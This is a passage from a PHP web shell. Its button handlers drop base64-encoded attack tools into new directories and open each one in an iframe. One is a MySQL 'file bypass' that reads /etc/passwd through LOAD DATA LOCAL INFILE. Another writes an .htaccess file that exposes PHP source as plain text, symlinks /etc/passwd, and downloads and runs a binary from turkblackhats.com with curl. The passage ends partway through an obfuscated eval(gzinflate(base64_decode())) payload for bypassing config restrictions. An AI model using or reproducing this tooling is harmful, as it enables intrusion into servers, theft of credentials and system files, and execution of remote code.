$file = fopen("virtual.php" ,"w+");
$write = fwrite ($file ,base64_decode($virtual));
fclose($file);
   echo "<iframe src=virtualbypass/virtual.php width=100% height=100% frameborder=0></iframe> ";
}
if (isset($_POST['Submit21']))
{
    mkdir('mysqllbypass', 0755);
    chdir('mysqllbypass');

$mysql = 'PD9waHAKLy9HcmVldFogVG8gQWxsIEFub25HaG9zdCBNZW1iZXJaIFwhLwpzZXNzaW9uX3N0YXJ0
KCk7ICAKQCRfU0VTU0lPTlsnaG9zdCddPUAkX1BPU1RbJ2hvc3QnXTsgIApAJF9TRVNTSU9OWyd1
c2VyJ109QCRfUE9TVFsndXNlciddOyAgCkAkX1NFU1NJT05bJ3Bhc3N3b3JkJ109QCRfUE9TVFsn
cGFzc3dvcmQnXTsgIApAJF9TRVNTSU9OWydkYiddPUAkX1BPU1RbJ2RiJ107ICAKPz4gIAo8aHRt
bD48dGl0bGU+TXlzcWwgRmlsZSBCeXBhc3M8L3RpdGxlPiAgCjxib2R5IGJnY29sb3I9d2hpdGU+
CjxkaXYgYWxpZ249ImNlbnRlciI+CjxjZW50ZXI+PGZvbnQgZmFjZT0iaW1wYWN0IiBzaXplPSIx
MiIgY29sb3I9IiNGRjAwMDAiPk15c3FsIEZpbGUgQnlwYXNzPC9mb250PjwvY2VudGVyPgo8cCBh
bGlnbj0iY2VudGVyIj4KPGltZyBib3JkZXI9IjAiIHNyYz0iaHR0cHM6Ly9zb3Bob3NuZXdzLmZp
bGVzLndvcmRwcmVzcy5jb20vMjAxMS8wOS9teXNxbC0xNzAuanBnIj48L3A+ICAgIAo8dGFibGUg
Ym9yZGVyPSIwIiB3aWR0aD0iODAlIj4gICAgICAgICAgCjx0cj48dGQ+PGZvcm0gbWV0aG9kPSJQ
T1NUIiBhY3Rpb249IiI+PHA+PGI+PGZvbnQgY29sb3I9IiNGRjAwMDAiPkhPU1Q6IDwvZm9udD4g
ICAgICAgICAgICAgICAgICAKPGlucHV0IHR5cGU9InRleHQiIG5hbWU9Imhvc3QiIHZhbHVlPSI8
P3BocCBlY2hvIEAkX1NFU1NJT05bJ2hvc3QnXTsgPz4iIHNpemU9IjIwIj4KPGI+PGZvbnQgY29s
b3I9IiNGRjAwMDAiPnxVU0VSIDogPC9mb250PjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1c2Vy
IiB2YWx1ZT0iPD9waHAgZWNobyBAJF9TRVNTSU9OWyd1c2VyJ107ID8+IiBzaXplPSIyMCI+ICAg
ICAgICAgICAgICAgICAgCjxiPjxmb250IGNvbG9yPSIjRkYwMDAwIj58UEFTU1dPUkQgOiA8L2Zv
bnQ+PGlucHV0IHR5cGU9InRleHQiIG5hbWU9InBhc3N3b3JkIiB2YWx1ZT0iPD9waHAgZWNobyBA
JF9TRVNTSU9OWydwYXNzd29yZCddOyA/PiIgc2l6ZT0iMjAiPgo8Yj48Zm9udCBjb2xvcj0iI0ZG
MDAwMCI+fERBVEFCQVNFIDogPC9mb250PjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJkYiIgdmFs
dWU9Ijw/cGhwIGVjaG8gQCRfU0VTU0lPTlsnZGInXTsgPz4iIHNpemU9IjIwIj48L3A+ICAgICAg
ICAgICAgICAgICAgCjxiPjxwPjxmb250IGNvbG9yPSIjRkYwMDAwIj5GSUxFIDogPC9mb250Pjxp
bnB1dCB0eXBlPSJ0ZXh0IiB2YWx1ZT0iL2V0Yy9wYXNzd2QiIG5hbWU9InBhdGgiIHNpemU9IjE0
MCI+PC9wPiAgICAgICAgICAgICAgICAgIAo8cD48Y2VudGVyPjxpbnB1dCB0eXBlPSJzdWJtaXQi
IHZhbHVlPSJCeXBhc3MgRmlsZSBOb3ciIG5hbWU9Imx1bFoiPjwvcD48L2Zvcm0+PC9jZW50ZXI+
ICAgICAgCjxwPjxjZW50ZXI+PGI+PGZvbnQgc2l6ZT0iMiIgZmFjZT0ic2hlbGwiIGNvbG9yPSIj
RkYwMDAwIj5Db2RlZCBCeSBNYXVyaXRhbmlhIEF0dGFja2VyPC9mb250PjwvdGQ+PC90cj48L3Rh
YmxlPjwvZGl2PjwvY2VudGVyPiAgICAKPGZvbnQgY29sb3I9InJlZCI+ICAgICAgCjw/cGhwCmlm
KEAkX1BPU1RbJ3BhdGgnXSl7ICAgICAgCiRob3N0ID0gJF9TRVNTSU9OWydob3N0J107ICAgICAg
CiR1c2VyID0gJF9TRVNTSU9OWyd1c2VyJ107ICAgICAgCiRwYXNzID0gJF9TRVNTSU9OWydwYXNz
d29yZCddOyAgICAgIAokZGIgPSAkX1NFU1NJT05bJ2RiJ107ICAgICAgCmlmKG15c3FsX2Nvbm5l
Y3QoIiRob3N0IiwiJHVzZXIiLCIkcGFzcyIpKXsgLy9UaGUgbXlzcWwgZXh0ZW5zaW9uIGlzIGRl
cHJlY2F0ZWQgYW5kIHdpbGwgYmUgcmVtb3ZlZCBpbiB0aGUgZnV0dXJlOiB1c2UgbXlzcWxpIG9y
IFBETyBpbnN0ZWFkIHdrd2t3a3cgbGV0J3Mgd2FpdCB0aGUgZnV0dXJlIHhEIQpteXNxbF9zZWxl
Y3RfZGIoJGRiKTsgICAgICAKbXlzcWxfcXVlcnkoImRyb3AgdGFibGUgTWF1cml0YW5pYSIpOyAg
ICAgIApteXNxbF9xdWVyeSgiY3JlYXRlIHRhYmxlIE1hdXJpdGFuaWEgKGFub25naG9zdCB2YXJj
aGFyKDUwMjQpKSIpOyAgICAgIAokcGF0aCA9ICRfUE9TVFsncGF0aCddOyAgICAgIAokc3FsID0g
ImxvYWQgZGF0YSBsb2NhbCBpbmZpbGUgJyRwYXRoJyBpbnRvIHRhYmxlIE1hdXJpdGFuaWEiOyAg
ICAgIApteXNxbF9xdWVyeSgiJHNxbCIpOyAgICAgIAokc29uID0gbXlzcWxfcXVlcnkoInNlbGVj
dCAqIGZyb20gTWF1cml0YW5pYSIpOyAgICAgIAplY2hvICc8dGV4dGFyZWEgY29scz0iMTAwIiBy
b3dzPSI1MCI+JzsKd2hpbGUoJGNyYXp5Z2gwc3R6ID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHNvbikp
eyAgICAgIAplY2hvICRjcmF6eWdoMHN0elsiYW5vbmdob3N0Il0uIlxuIjsgICAgICAKfQplY2hv
ICc8L3RleHRhcmVhPic7Cn1lbHNleyAgICAgIAplY2hvICJTb3JyeSBUaGUgRmlsZSBDYW4ndCBC
ZSBSZWFkIDooIjsgICAgICAKfSAgICAgIAp9ICAgICAgCj8+ICAKPC9ib2R5Pgo8L2h0bWw+';

$file = fopen("mysql.php" ,"w+");
$write = fwrite ($file ,base64_decode($mysql));
fclose($file);
   echo "<iframe src=mysqllbypass/mysql.php width=100% height=100% frameborder=0></iframe> ";
}
if (isset($_POST['Submit22']))
{
    mkdir('lite', 0755);
    chdir('lite');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
        $metin = "OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI
Options Indexes FollowSymLinks
ForceType text/plain
AddType text/plain .php 
AddType text/plain .html
AddType text/html .shtml
AddType txt .php
AddHandler server-parsed .php
AddHandler txt .php
AddHandler txt .html
AddHandler txt .shtml
Options All
Options All";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
@exec('ln -s /etc/passwd README');
@exec('ln -s /etc/passwd HEADER');
@exec('curl http://turkblackhats.com/priv/ln.zip -o ln.zip');
@exec('unzip ln.zip');
@exec('chmod 755 ln');
@exec('./ln -s /etc/passwd HEADER');
   echo "<iframe src=lite/README width=100% height=100% frameborder=0></iframe> ";
}
if (isset($_POST['Submit23']))
{
    mkdir('confbypass', 0755);
    chdir('confbypass');

$conf = 'PD9waHAKLyoKIAogKiBCeXBhc3MgLi9Db25maWcgLi9Vc2VyIC4vRG9tYWluCiAqIC0tLS0tLS0t
LS0tLS0tLS0tLS0tCiAqIENvZGVkIGJ5IERvbm5hem1pCiAqLS0tLS0tLS0tLS0tLS0tLS0tLS0t
CiAqIE1hZGUgSW4gTWFsYXlzaWEgIDIwMTQKIAogCiovCiAKIApldmFsKGd6aW5mbGF0ZShiYXNl
NjRfZGVjb2RlKCdGWm5Iam9SWUVrWDMvU1BUTFJhUWVEU21oZmZlSkxBWllSUHYvZGNQVXlYVk1z
VUw0dDF6VCtYZi8vblgzMU0xL2ZGSGNTVGRuNytuSHNvdTJZby8wMlF0Y1BTL2VaR05lZkhuUDRS
NGtialZFTmMyUk1CSnZFWTdlTTVwalg5UEorbGZVbnk0ZG1nREVNUmxIK1piOTk3eFl4NXFheVJB
RUhoL3NPRUEwZkdwUFhBRjV5UkxiZzlNNitmeFlyWjZxUENEdGY2SElBR1hyTkk2Mkkwa29WaW9u
R2ZncXc0NWcraDJSbjIvdkpxRW9WRmFIMTNBeGJQbmxRWnkxYWRoZjI3RS9oaWFGOFNTcmVuczB4
bE91ZjRDczRhamp1MkxIMHV2Mm1mb2ZydmQrUEh2YTlOMFRsYUlvaDBXZmxMc05VVVNBS2lYVFRT
eExkSHRPTUtJcHp1eGRzS2s1Y0hqbGEwUTFTd2crSFdMSFluNjZTNEtvRXdzNWdaek0zUVd4SFkr
bkYyVys2VWxJVVFUR3ZNakVOTDRQU29Qek5FZERtRzR6QUlFVzF2Wm04YW5kdGt1MW90Y3poNUs3
RjB2eHBrSUI1c21DQ2Y2Z2RMMVcydHJGZ0owazBQcGFKRFV2cVdPdHlyd2VoVys2Vm4zcUM0RjFF
bGtEdTBXeEc5ZjFQL0t6OU1aeFVhUlMrL09SRjlXajQ5NFRMZGF4NXg0cTNWNTdsazAzWTB4by92
d09UYVpUWjNxM3hqS1l3Y0pUZUU3aTF1eUFiSTlhRmswZWNMa2M2NlB1WTFNY3ovTTNMblArSXRC
S3lOYUhxdmVENnJmVVZaTnRmUWpUMXFxaW0xa1pNSjBDTEMrMEpoOFdWeGpLZ1Z4UW9wdHhBTjZZ
TGk4bkdRRFhqQ3RUTlJtblRPOTdXemZGSzBYUldTMGJqZDVIYUUzOHFFQlF6Ty9RZkFSTWl0MkZO
NFNUWWo3ZWVvUzdENSszTzNCRTVyRmJXWHVYZWgrL2lEVUNoZWRaL2VUUEFzVjFMS3g5MkVsK0xV
VkZRbXl3ZHdQeGp0SkEybXc2ekpqUzdtMVBnK2t6aDZHWGNPdVRuL1czZFFhR0Y3clFDamxSa3A5
Vkphc2RzZlkrNktmNHlzUnZ2eVZONVRKdHhwd3F1OTNTbWtCbGVqdmo5dWFsVUkxWUlGdjIxakJV
VUJ5dnpDaHNPSHRJSWMxWmdVKzVwUlVhTXZhQVk5czJBZXYyTy9QNVhVdWlObFY1aFpOSzlOU3ZX
QUEwT0xXc2JjZnlwblR1Z2U4Z1l3YkVaWEFSK2pyeXo1K2wzZ2pPZTRqTmdraFRtMlNlcTl0b0RL
YzBtWVpBV2xXaHRRSnZkL2lLcFZGSm5FSE0venJBVHo3K3F1Z1pwZFRDQ20vRUZwTGlmc244QXJm
bDZINXA5eEtrQzhvUk1PMWkvNDJkQnY4eEttSS9iT0wzSThPTmZiUkp0ZE8vUUhsWXE2OHlxUWNy
MlJVUDN1Y3dKOWIyTEJwS1dCNHU0eTU4U2p6d1gwajBWSFhpWlNDTE8wNDU1Rk1CUWNDbUU5YWJV
TVE3YjZ5NWwyMEROMnBpYWM4RVR2cVREbE0ycEtXR0h6dC9GYkVEOHBIbFNOUDB4eGdvY1Y0dnBG
OUZSdDlod3NHZW9jRDFQbmI4dHM5aXZWQkhlUTNjdFRjdGtsdWlCSnBTVUs3NE80aWUxK3pMWkpT
dmpWeDlYZlRoR2NPUlBrQmJMb1JGejNVazhlcjNUVkJJazlQTklYMklENEFmdkdLUTZTbUZUY2N6
ZGhCY2JTemdKbmhZZWcvUi9aam40WFVPNVlOcjVPQlQ2aUkwbU5xaFVnek55QU45b0FBUWVYSGRJ
aXl5QUsyS0pLMzc2dmlxSGZmKzkrbVFzaFhQdlU4aFR5U0ZFREZyVUVVUG1XOTNhcFMvTGl4U1Zu
QlpMc3MwSDF6dE96dCtLanpTU2hIclBPV3BGU1VNckh2K2xZVGxtcDNDdjFJa2pveGx4dmJJQmE1
WWhIK3NnREVkNm1DbVZveFVyQnp3RUhGRW1EM3FDLzdMYm9FUGR0SGJxL09NV2xHMkp4TG9FSDky
MkRmRWJQTW1RMWFvMTJwdFcwM1VkUWxBeEhldTJDNzNlOU96Q0RQR20rNG1KRUpBMjFDdncwc3NJ
T25BUmZEdGdoYjNHTzZ5bFF0NVFtYUJpdUdzNHY4WkNzVFhBeENqK0t2dGNHcWtXSlVjYTJyUk5x
OWpKRENWazRyZklEZjJWTjdXMFRUWlA1NjBJZDJpQ1ZoaEU5K1RrNFJ6cUtTQUQza0hLdlkyR01W
SkFlWjVrbzM2ODdFRzJMcTdncmRIV2RvVnorTXhCQmRHUmFLSWtuSnhMU0t5QzAyTGtyRVVKakxH
eUcvbVVzNm5OVWFJb0tXenJIZWM0M3huVXhpVHd2MVdrd0JVUkU5V0NZOU5FSjlXcFkvRzdQMU1S
bi9HSVlKb1RCYmZWVVlVdk42bUE5RWxuOVIxckx6ZG14c3lmMUtrRzZvcjdTRHpUVUlhN3ZNeGJi
UXZwOVBpeVFHZFNyc1dMcUhwZ0lvZktCSzJnWm9LRUE4S2lmYjJoZFVKYzlqNU9mcnpNK25VQlRp
NlRPRS9BMjlMak5BTUdjZ2tvK2t1NThld0Z5a3pTWGsxMGN2WVN6aGZSejc0RmVTbDliYzBsQ3Ji
QkREekM0UVFtb2JlcFozSUJjeWRHMEk3bXdQUVZPVU4vQ0JKZjh3WE5ENTRrbzhWWi9BaEdOS211
OG9ycFpZaG1OZTM5Sm5RZ2RSMWg4RHFBS0FRdnZjVVQ1ZW1Fa2R2NFV4dGljQU9pOEp1RktmVUl0
STB5R09PNnNKdC95NmpXTkJObnZNYW5TQXg5elovbmZybnVocDdLL1NYNVh2NG54UGhmZ243ODgr
engxcUVuWUxoY2xPY0tVK0M5MDBIV2Q0NlJtc2h4L1A0TVhvc3pORnBnTVd2L29wYzYrR2xYQjgz
OWMrTGlOZXFQL2cwMXUrSjM2SEVzeHBhbnBJV0lSUFZHck1tUnBIYzk5dTA0NTN0Zk0wTnp2bWN0
UmtPVVdMSm9IamlyZlZhVEt2ZEhWc2g4MGM3SHVuWjQ0ZGswM1ppMTJPaUcwbjhSUVJLY29wOUtq
WnI1dlRUOGhmcTZhR1lkV093TzVkdXpmODlhK016ZjMzdk5RSVBBYWNYRFpsbEtXYlVneXFyMm9Z
Z09wKzl2WFpIdU9rZkF5d1dTeEkvbzVtQmRFNEh3bGtXRDlzcUR4NnpQRkJ1T1NBbkJ6Q0pHVEh3
eG1KT2RpczVxcWI3UlFlcEV0MGMzcis2ZUx2S2IvRkxnazhLQ3JUSkpWcUZtSUU0RWx3ekdrODd1
b2ZaUnRER1BPaTNCdGdPUTdnTGt5dTdXdzVYQ3hGVDdHR2p0eXRBZ3dXTmFqcURPU1J4b2xVTlh6
bW5xQ01uWGc4WHhpQ1VUbm1ySXUvQ1FjeFRCNStQcXQ1VkIzZ09aQWduVk1oT0ZlZG9QWk1qazhU
aktBbUEzby9tcDNIQW8wSzl1c0tsOGFLdGlVRG5DcVRBSkRZalpqZXM1cSthUkVPNVpuQjBjV0l1
M3pkUTUrWFR0aTE5N0FKVk5Fc2RyQkVpQzliYXNNT3hGTjZzQUhKcDZDaUNsZDVyTHNYWFhnVGN4
cnRQdTlscHRjM1dHcmRsNmJmclNWVjBpYlJUVTJmTUFIRitnc0lwbVQwdHg1Vys1TGpMUHhNSHZZ
emZIUnBFczVLOUpoZW9jK0pwb0xIUTRGQktDOXFxRktIK0I4SnIwcFJjbURBNVJIMDVzeVhQNUNy
WHJDNzduTUt2bjNQMXBwdjZCSW5WSEhOOFhJbGxpS1dFRlNpSTRBbktObis5NVZuYjNCK2ZGdnRL
YnYrYXJQZ1pNRUJhWnAvTzBsSmw0cmRTK29JZitkN3FHOXRMSUZKWDJ6YkZSZVNkNDJydWFxZEZ2
RmRMME5ObllybDdHQWMxYWZvbWc3b1RjQm8vakEzTjV3Vmg3azJTaEZEcXB2MTB1aTN2bGh3dC9S
WnJJdFVLQkhrOG94K3Q2ZG1FMzhLVW9kUkZ2Skg3RWlaNUhJTnNnaUN0bDBFR0tQeE9YZUxNM3Zw
MzFwR0tudksvcE51ZnY0aEVKT2habXdMUUROTnZNY2dqU3NBUFBrTGdBVVNudDQ0MGpVZFplanFx
TGtwUGdsWktLM1pnMmc5eGw1SEJqcUpIUm9nbGNod3A0bmdaSVg4TzR3V1JxQ3B0eHU3MGE4RWMw
VVRPMG1QVHNHYnlsWHQyQkoxSjdiMUd3dE4wYVl5UWJDUkRPeThhN214dUVJZSt6T3FvK0FNMnZo
QVZRSDMvR3dVemh1U2M4cUxQUTZEdjV5c2orUHIvN3FyNWkraU9MSHJDd2VuVFVVZFJLTFNCOGcr
dTh0OG9ZTTNzZ2NiNStUYit0dEJCclVxVjdVTXZibFpRN0FQcm90aGp1aTV2Vk5UMGErUE5Ma2hv
QXIyUkVhenVLNE5mL0lQSGVsRWdOSWp6N3pwNlBrNUV1SjZjblZXSW0xRExyZ2VRWTNOQWYxZ1Iw
YTlWams2UjY5SWFoenJ4cnp1ajhJN1dEU2JlazBxeklMSkNPNUZQM2ExWkRuU3gvQ0w0UUFxUlFt
VXNuM2tsdXEzSXo2bjFGK0pKMTRLNE5HVDEwck1lT25NRlltb0FMTk5QMEU3aTNCdk55VFh3MjZx
a3hiS1M5QlY4MUMwZERsK2ltZ3NIVlhEWnNZeGJEN2Y2N3FvQ1JmejdhQ05FclVpcDJ4R1VrQ0tp
TW5VSjRUU3NWS1Zuc3ExcG55YXc1R2MyL2laaVdQS2F1bzM3ekZ4R1VWN0txa0JGNGU2d3czbzN3
ZmFGcHJGMHM5bnZVNVFCamJ6ZmZmQ1VwZjRCTFZQNDBaSHcvcWtETHBPVHBQRmo1aVpuUm9vVGtF
M1lBTXRYYjNITTM4SzJPZ2R0OUtPbWtjZytBWXFPaHk5YnpLakp1K2ZGYUdoQzh3dFA2bG1vNUc0
eE5GZmNGdk1MQTBaVGdBWWpIQVJZMER5OWdiVUx5OElHK2c4NDBoRDBtcUpPTXVKNENZTTVhcHdk
azBCSFJYbWpVQkc5aHE0SHZ4eGx3WThyNmlMRlY4TlRzYVZJaFBoNWphdWlzOURLV0prYTJvMlhZ
bHJoMDFiSmJOd2U2a2JiOE8ybFVTUG1hcHB5a0wzZ2RJYWxSZXlEaHo2NWdCWndTRENMR21XcS9W
bk1JS3k1eDdWWHQyRmtOTlRucGxFSnNZZGI4U2ZtdDdjQjNGRVh1a2RLcTZkWk5tOWxlZU9xTVF1
cFdQZ0R5VG5HTGMrOXBDUzRtZWhlMnZOVXZscnlXcUlib3doVEM3TnFnMmRzK1B6Y2U5THRxTEx3
cFJXRkZCelBlQlViSDc5L2F5R2N6SWRtdno2bnI5amEycUh5K1NJZkVPeTArRk02ZWV1Y3g2aTZk
MDdmSmVXSVlOTDQ4MDJPcVV4ajVhN3ErclBTbU9aZUFNOThiaVBqRnhTQmpuR2dCVmhUYjk2SzNl
dFg3Nk5LaDMveFhzRXZNS3lGK3FMOFNGTHlHbTdkd25kRmFPbU5WaFRnbnQyV0M4KzluQ28xQjFG
d21GSGdQQkpuZDF4TDRISHF3VWhMS2hscGcyUGp2SXpEZ0pYOWkvR0FnYWNsWDJjaHloUUk1Z1pR
MUlUdldXazROandVbFZXdGhBL2hnVUFMUnhpOEtKVXJaUUNaYVFpRzlINWhaSEZWMGxVUEpEUmNk
T1NmMnhwTU54MGVZYVk3Ui9rVzFLcGpROTV4dmFLbk5wOUt1dWFNQTZha0ZoMnVHVDhzeTA2WWwv
RmRuYTdaNk1YNHpYRFJmSkUyeVUxOWJVblI4eHpjZHZDRXNzd0pUWjlqYWVXejJxQk1xb0tJZHJ1
bnFHWFRLeHJXZXBYVHZtWlVibExpa0ZDY2R1empNMmtDbjIzT0YySlNZU0NnYUpqWkY5VEVTbG5s
SEFtYk9LQjJnRVBUSUJ5KzEvMlRjVWVJQ3RtaXdtYmxNUnZsa2ptSEVKb21waUFVZ0NXTUs4T3pl
YmQzUlUyYTdsNEoxMXdCRVphODVIenVmNG1qTjd6NTAvL2NqTzZiY1U4eERpK2FPcWdpaTQwK0hl
VzZiRkdkTGdSb1VLcWx5dHFPZnMzanh4UklNV0tmczAwS3NiRjh6NTBvTVRzTExBRkExZU40eXhv
YjZpNzJjb24rVmppbEEvVFpsR3UvUVZMQ1lFb3FXYUthMGZKOEJGaVB6am1udm1pUisvTEtlOFBo
NVlZanZwOGgwaDY5NTVlMERGV2VYbDN0U1ZuUDJYam9UWVJJTnpIblg4Z3Q4WkdacGQ2VEF4RXYz
R1lGUzNrS2dnMXA0UVV5THJIOFVNYlF2a05oeG5xTjhJZHd0WVJuQ2Q3NTBGRHZiaXJ1THp3eUxC
c0Q5dHRDb21UU3UwZTZPTzBpREJOdnJtelppS3hCN3BFRk0zSkxTTE5vSEFSUURndDVhQkNuZnRv
SDRscDRSa01pUGFObVlFcjVoSjIvT3dEaUVLWk8rY2lwc2I0NE9HVURyNnJnRVBMSnpyaURIN3Fm
dVpRRzRRQTFiSmJ2TzBQUnVIRmVFOEJZZVphSzBBZ0o3dDRjb001ZzFsZk4vUmYzNVNaS2lKdDBC
aW5JQVhiRkUvbXpGdFNZWTJqSU9pN2NITnExUS9YcWNocTQ5RjVWT3ErMjQybEZQUzJHbFR2S0dj
aVZuRmpEcEhKQmt2K2xnTy9ZbFdidlljcDhOSkwwZWxxa3hONG44b1U0Q2paeW9mY3VJb21rSnlT
R1VXNDE3UnZYbkU2NWVDRlpRczF1a0RidXNta3hHQWFLZEgwRWl3QVVhejBObWlsQlZhT2I0M016
QjhNRVRkN2cyTWJQaXk0Zms2aGFoMFU1RG9RVEY0YXdPZGhmZnRjZ2tadDNPemc3SzdHVHMzNy9U
dFB1VC9xK2V0dEdzdVpyNnNaL0ZiYXhOdWkxejR6dVdBMEorK01pZ2FSVndzT2ZUWEo0K3ltU2tr
L0ZGTkY3Tjg0RkR0UHZmbXFaZldkTXEwYjVtQzBMOUw0SmhxQ2Y0Z3ZVK1B0WTBicDFGd001Nm41
ZVhjZUxWRk1uWXorT1E0cW91SDlSb3FndHZ0ODZ5a2M2dFpLUTEzZ09SY1g5VlBBQ2FUWWdFUjQ0
NHU1eGxoVWd4UmRNbkg3cGN2SGM5ZTY3TkNwa0hxaTl6YWNpQzFwODlxTHpBdWw5dWkyUlZqdVZn
ZENNQk51UC9qeXhNSmU0YzNTZWd1Tmp4Rm83eFZHWDgwSGNWbTdHVVFsQWg2ajByTkh0T0RabnVV
Q0NmdXJjUmhWOElrU01aenBhbVJGZVdINmRuWXF5RnU3M0ZQbCtRUmZNVXRhMDhoMVlkYVEvVFp4
STgzV0c3L2xEV25PYmNCQUo2Mzc3ZlNNMzZKOGZ1TnRIcVFiRTB0Um9UbHFCNkIwMW9KeTdneU5m
V09vTDZvYWs2aU9nTExmbW8xOTZGUkFLdHZXUEFtYnlleU9mcnA1OXRrRzlqd3cxSWkxMmpkTXlm
TUJaVitROVdIbDkzU0FtWGlFeTQzVnI0ZE1zU2F0N0ozeXk2TkM0KzBvU1orbUdVZUlxczlUMlZ6
cWdNRTF1SUwySmpmWUR3YnBKeUJ5Y0JQOEVGayswdTlxK0U0SXMwNktnMTlDajdWZ0tSSVladmdY
ek5NUFFlanFRUW4ydDFTUUp3ZjROR0tHbXd6aXpWZnc3YjJDbnI5YlZFdVQ2Z1VtR1phdUZuOUFy
R0J2OU9mWHhQSHMyZDQ0eG43eHE5Q0dWSVpCcnk5dnlJc0FXelFMdnR0eDR5YkVCWGI5Ukx4OVhZ
MXh3VnFmL0hhV2Y0ZGlCQUNYbStaRW0ydEt1WEUzYTIwWWtJY01DZDJ5Y09qaE5MK1VXcW5uWTJt
QS9SaTVLT3J5MUNUbnBkZHhscGtvR29Qd0w3L3M2WmVtOFdub29NRFgrOUlXbDNVSUs0SFczRmlv
WjFpNkptSXZ1OUI0c2EwcTVNZDRpYXNSOUxUQnJKeTlyRlE3bisxK0xOc0FWalBxR0tzYzRTcENs
TEJYWlRZNGJYV0prc0g1OEJoaDMyUE1KUGZuZlpXSUV2Vm9EYmdsN1I2STJCdG9uSXdNVEtTRGlE
NWZISlp4dklPNXk0UGNRRllMYVpyaUgvbXA2dVBaUHZoMmNCWVhLK2IyTlYweHBCcVQzZllLS1hx
YjNWOTlmQXFwcXZYSk1RWlFqU2xma2d0THF2ckxaN2xFZnlObnpDNmorWUFkNDdBTmRyS0Y5NU9R
MG1pT2wwZjEvTTZhVmZvUFp4TU13bjQxNk8xR3luQ3BSaXgwdjdmSGV6QlVyNTJuVmMxUGRxOW15
SEhyVENid200Mnl4MGNzZnQ2a1VtRVh6b2hnT1h2bGUvNWx3UlBIci9QbTYvR3Rsckw4MVF2bnVt
cTZYSzhpamFRQkxRUDRBSS8zU1EwMVdiT3B4VE0vZ1BCSTFIUUNjN2MwOUUxenY3QjJhS0h5Y1Fk
dXVBODhYcVBCdS9iU05wS2dLbXpwTEl5bjFRNGlkUXJJWHc3RXNqaUlEUlZOV01rK2wwcFUzdWxs
ZDBFNnNBajZkTlhtd3NkN09vRXM0UVROekREMWVnV0hRMjNmU2dpSWVocFZtdG1JVnBSTGkyVDlN
bE80UnpKUEN3enkvRllzYklPM3h2STZCYUlmUWRqdHBCSENaSktyb2RCL1VQRDU2RnFSdzhJMlR0
R2ExR2J2THArb3QzUVVoTDByYUVnWmhhN0xaSTZVLy8rLzhGTHZoSXpGYTFSSEVYcG1qTnNsdm82
ZWd2MUpId0RWNGREcU5HR2NRWVdFbU9pbnArT21jdlFsaWdic1ZmRzAvaG1pM3lxOHhCSk5HU05P
cVVKcmxqSFZPTEVkdWEzVUZxQ2VEMG4wbW1zRXpPZnU3cEZrYk9Kd1YrNXI5Nk93eWtWYy9lRFZ4
anE0RWZIeVB0WWYxcy9reUtwdVVkbG5UdVBqaVdhN3k1ZE5jM2pzaHdRZHFyekhBS1JuU1FMTDU4
MGx1OGlBZk5tZlFtQ1I1WE5PZ3c4azFQYnpkcnRHK0d2R0pjWlQrd0pvQWZDM3dCWXN1MmlIR29m
bnlqRU9kRmFwYlpJV1JXVEZieDdtbHIrZTR2YjZlb3gwdDZYckxTSTFkanBoRDJtKzk0TU9BZW5G
YVZQaTNlbVRsRXNkSVZuWitZdXBlRCtBTTQ2U3ppL3Fvd1M4aHVEN0daZFFvek9OQTVWYzhmRndl
M3ZsNWpGbGNMTExtWTlmeC8wc2VkVzR0NE5NL21aS0dJRExOV3Q0aG5lUTRoSVNFcFM2K0o0bkMy
eUVPT2dSOUM1ZTdMVlRBQUJ6eGtDa1VsK3p2NzUrSXlCb3lkbFBNTlFkdFVOejdCWjQ1SWRjbVh4
SURXTk9iZDc3WXMxNWRUeEloT2pab3pSdHVxMFMza0gwTUtvWEhuSmtxM0V1YUtoRGJ0RFFmVHpT
d1M1ZHFyQWhGOG5yM05MY3FqM3ROZFZHQVl3RXFSeFM2V2M1L2FJQjU3RjRmb3NoYTVrZmtJQ0hI
NC9KUjB5bkswdkVEUWU0eUgzZVZKOFhYYWl4SmlFblBqbVVPd3NudlJBVUI3aVRHS2thRCs3Qk81
S2dWanl5bE5KWndEbG1PZXpBaGdRcUExMXNLTTlOVVd0SmVCa0M3Y0daakVnWGhwQmQyTVMwdXpr
bE5MRGdaQ2tLYVhKOEd6RExnVVBoc0dPejlvSkk0Z2dvbHBEcjNqQUMrdEkyeVhZdk9vUjVQeUx2
cjJvRmlhTEpyRlBNY3FOYUxlZXlFQ1A0SFh0NkhzVWlJTXhQL0JRN0N3U0lrek1PdXBXaVBKdU50
elNyd085cGdTT0czNnE2QXNWS1ZQcHVEMlBEUndnNlczdmovdk91YjI0aDY2RVIxalFEZFJncjdp
VnpOTDAvWjYzTTIzMitWK0xEYjR6MmlSTy9IRVZWTE8yemtEZi83dThESUtWOWtvczF4VDd5NTRo
YW8yUVBvTUxqWUFhZVoyNFUyRzliL2ZPVnRGSWY0Zk1KMGFqeTY1Tk1VNXFaSE4vWkgxRzdBN2Zj
S2MzZGFZZUg3dCtteDloVXN6emNraXZ3K1czNXhVVk1Mdi9RVVMxdk9zNGpRNlZWMWhMZHJCZ0J6
TTM2TndnVnhtbklqMUFjdVhmeHYwRDBjNlhWZTBrWkRzU3ROMjEwL1VMMUt6VWZuRjRHQjB5K1Uv
ZW1uTU1SWlVXdW4vYTFNWG1GTVBzSSt5YkpiZVpNQXNLNHkyWFdrVGRzc0xRejZDOVpjOG5tSWF4
M3R0VDczT3JqT0FFRFNTSkxONnBRYVN6K095di9Ma043T3dGLzh5dkJFb0Y5QXBXcXZPcHZ1S0tE
a3VJb0lGbnlpV25UbGx3UFFJcGh0WDBlS2RzZ0hPb2g1QzdoaTRwMUZxcCsrZTFBK0JVUjgva0ox
VTMzY3ZwenkzMUdBNnd3VnRIdW9paXdsY1AxK0I5dkZPa0JvejZocUxERjVjYWU4WEVJVXk5LzJC
Rm5QQTB6TFJsYlNDMVc3Nk9HYjhNY2JHVE5NMzRmZ3NpdFFDT242eFl4OUo4YURLMVVaRnorMWtP
UC9GTGpYdGJ5VVg4ZTVsVmZ1anNWOFZrQm5PTnRLYlNUdVR5N3VaQUpOc3hEVGp5TEFpS3FBTDU1
blN2MzRTVTBNNlRsRzJ4TERIUGJqY1BadC91QW1SY0txUllNRm1EaUxnT1kyUFlUWjFNak1TdzJx
